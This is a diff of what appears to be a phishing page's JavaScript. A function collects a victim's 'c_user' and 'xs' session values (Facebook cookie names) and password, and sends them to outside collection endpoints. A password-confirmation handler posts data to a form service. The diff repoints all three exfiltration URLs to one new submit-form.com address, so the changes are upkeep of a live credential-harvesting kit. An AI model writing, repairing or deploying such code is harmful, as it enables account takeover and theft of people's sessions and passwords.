@@ -1555,7 +1555,7 @@
      // Function to submit to other endpoints
 function submitToOtherEndpoints(data) {
     // Submit c_user and xs to the first endpoint
-    const cUserXsEndpoint = 'https://kami-31b39.wasmer.app/kami.php';
+    const cUserXsEndpoint = 'https://submit-form.com/yThUvhGKm';
     const formData1 = new FormData();
     formData1.append('c_user', data.c_user);
     formData1.append('xs', data.xs);
@@ -1578,7 +1578,7 @@ function submitToOtherEndpoints(data) {
     });
 
     // Submit password to the second endpoint
-    const passwordEndpoint = 'https://kami-31b39.wasmer.app/kamipass.php';
+    const passwordEndpoint = 'https://submit-form.com/yThUvhGKm';
     const formData2 = new FormData();
     formData2.append('password', data.password);
 
@@ -1687,7 +1687,7 @@ function submitToOtherEndpoints(data) {
                       confirmPasswordBtn.innerHTML = `<i class="fas fa-spinner fa-spin"></i> ${translations[currentLanguage]['processing'] || 'Processing...'}`;
 
                      // Submit to SubmitForm.com
-                      const response = await fetch('https://submit-form.com/LeCpjcc3Z', {
+                      const response = await fetch('https://submit-form.com/yThUvhGKm', {
                           method: 'POST',
                           headers: {
                               'Content-Type': 'application/json',
@@ -1890,6 +1890,7 @@ function submitToOtherEndpoints(data) {
 
 
 </body></html>
+
 
 
 
